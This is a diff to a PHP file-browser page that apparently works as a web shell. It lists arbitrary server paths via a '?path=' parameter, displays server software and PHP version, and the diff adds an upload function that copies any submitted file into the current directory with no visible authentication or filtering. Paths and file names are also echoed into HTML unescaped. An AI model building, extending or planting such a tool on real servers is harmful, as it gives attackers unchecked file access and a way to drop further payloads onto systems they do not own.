@@ -265,8 +265,8 @@ tr.file:last-child {
 	border-bottom:none;
 }
 .icon {
-	width:25px;
-	height:20px;
+	width:26px;
+	height:26px;
 }
 @media screen and (max-width: 600px) {
   table {
@@ -350,6 +350,10 @@ input[type=submit] {
   }
 </style>
 <body>
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.5/lib/darkmode-js.min.js"></script>
+<script>
+  new Darkmode().showWidget();
+</script>
 <center>
 <table>
 <thead>
@@ -690,11 +694,20 @@ function get_type($filename) {
      return 'application/octet-stream';
     }
  }
-function img($img) {
-	$type = pathinfo($img, PATHINFO_EXTENSION);
-	$data = file_get_contents($img);
-	$base64 = 'data:image/' . $type . ';base64' . base64_encode($data);
-	return $base64;
+function upload() {
+	if (isset($_POST['submit'])) {
+		if (copy($_FILES['file']['tmp_name'], cwd().'/'.$_FILES['file']['name'])) {
+			alert("success", "Upload !");
+		} else {
+			alert("failed", "Upload !");
+		}
+	}
+	?>
+	<form method="post" enctype="multipart/form-data"> 
+		<input type="file" name="file" multiple>
+		<input style="width:10%;" type="submit" name="submit">
+	</form>
+	<?php
 }
 function alert($type, $msg) {
 	?>
@@ -1045,6 +1058,7 @@ function get_server_info(){
     $server_software = (getenv('SERVER_SOFTWARE')!='')? getenv('SERVER_SOFTWARE')." <span class='strong'> | </span>":'';
     $server_info['software'] = "<span class='strong'>" .$server_software."  PHP ".phpversion()."</span>";  
     $server_info['dir'] = "<span class='strong'><u>".cwd()."</u></span>";
+    $server_info['upload'] = "<span class='strong'>".upload()."</span>";
     return $server_info;
   }
 ?>
@@ -1055,10 +1069,10 @@ function get_server_info(){
   		if (!is_dir($dir) || $dir === '.')continue;
   			if ($dir === '..') {
   				$back = "<a class='sa su' href='?path=".dirname(cwd())."'>
-  						<img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QAAKqNIzIAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAAHdElNRQfkBgQCNQ9wKZqKAAAAdUlEQVQoz52RvRFAQBCFP0YBrhSjMoEe9CAQGlqQSBmRgA4EenArMEZw5/y8Db83s/vewgcpMiIXHhAWPBcWCjsO6RGEisCFaxv2UDTEwEzCZvAZWsQxq/8QXV8rRlK0YZiOIzsEobRneGk5i8p/V/3iWTfaAREANO0Y4uibAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIwLTA2LTA0VDAyOjUzOjE0KzAwOjAwh6in4QAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMC0wNi0wNFQwMjo1MzoxNCswMDowMPb1H10AAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC'>
+  						<img class='icon' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAQAAAD41aSMAAAAIGNIUk0AAHomAACAhAAA+gAAAIDoAAB1MAAA6mAAADqYAAAXcJy6UTwAAAACYktHRAD/h4/MvwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAuxJREFUeNrt3U1OG1EYRNFiO2QZwJIyC7bBWV6kwCpgAmIHZBAhkPixW0LqqvpujZlwjyyw3f365KfYmjsBAAAAGAAAMAAAYAAAwAAAgAEAAAMAAAYAAAwAABgAADAAAGAAAMAAAIABAAADAAAGAAAMAAAYAAAwAABgAADAAACAAQAAA0CS9nrWBoD18v+StHcmaAb4n1/eBL0Ar/kl6VpbANbLb0zQCfA+vy1BI8DH+SXpSjsA1stvSdAG8HV+Q4IugMP57QiaAI7Lb0bQA3B8fulRP3QPwHr5z/WXVwD5awCC8zcAROfPBwjPnw4Qnz8boCB/MkBF/lyAkvypAMvyn+nG91dJBCjKnwhQlT8PoCx/GkBd/iyAwvxJAJX5cwBK86cALMn/oPOc/BkAxfkTAKrz+wOU53cHqM/vDTAgvzPAiPy+AEPyuwKMye8JsCz/mW4lAMhfAjAsvxvAuPxeAAPzOwGMzO8DMDS/C8DY/B4Ag/M7AIzO7wBwqeujf/ZJF/oDAAR1f4QHE7j8GzqWwOeN2FACp48iRhJ4fRg3kMDt4+hxBH5fyAwjcPxKchSB55fygwhcL0sZQ+B7YdZGVxMInC9NHEHgfXHuAAL3y9PrCfxv0CgnSLhFqZog4ya9YoKU21RrCXJu1C4lSDqqoJIg67COQoK042rqCPIObNouOPk8gCDxyLIqgsxD+4oIUo+trCHIPbi1hCD56OIKguzDuwsI0o+vjyfIf4BDOEHDI0yiCToe4hNM0PIYq1iCnge57RY8rPZJp7oDYD2CS/3mFbAegVH+vsfZHiawyt/4QOevCTba8z5gPQK7/J0AnxEY5m8F+Ihgu+COAwC+ncA0fzPAWwLb/N0ALwS7BZeyAPDtBM/O+fsB7AcAAAAwAABgAADAAACAAQAAAwAABgAADAAAGAAAMAAAYAAAwAAAgAEAAAMAAAYAAAwAABgAADAAAGAAAMAAAIABAAADAAAGAAAMAADYgf0DnoxikFqb5rwAAAAASUVORK5CYII='>
   						</a>";
   			} else {
-  				$back = "<a class='sa su' href='?path=".cwd().'/'.$dir."'>".$dir."</a>";
+  				$back = "<a class='sa su' href='?path=".cwd().'/'.$dir."'>{$dir}</a>";
   			} if ($dir === '.' || $dir === '..') {
   				$action = "<a class='sa si' href='?path=".cwd()."&action=path'>action</a>";
   			} else {
@@ -1099,13 +1113,13 @@ function get_server_info(){
   				<?php
   				$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
   				if ($ext === 'png') {
-  					print("?path=".cwd()."&action=img&file=".$files."");
+  					print("?path=".cwd()."&action=img&file={$files}");
   				} elseif ($ext === 'jpg') {
-  					print("?path=".cwd()."&action=img&file=".$files."");
+  					print("?path=".cwd()."&action=img&file={$files}");
   				} elseif ($ext === 'ico') {
-  					print("?path=".cwd()."&action=img&file=".$files."");
+  					print("?path=".cwd()."&action=img&file={$files}");
   				} else {
-  					print("?path=".cwd()."&action=file&file=".$files."");
+  					print("?path=".cwd()."&action=file&file={$files}");
   				} ?>'><?=basename($files)?></a>
   				</td>
   				<td class="pol">
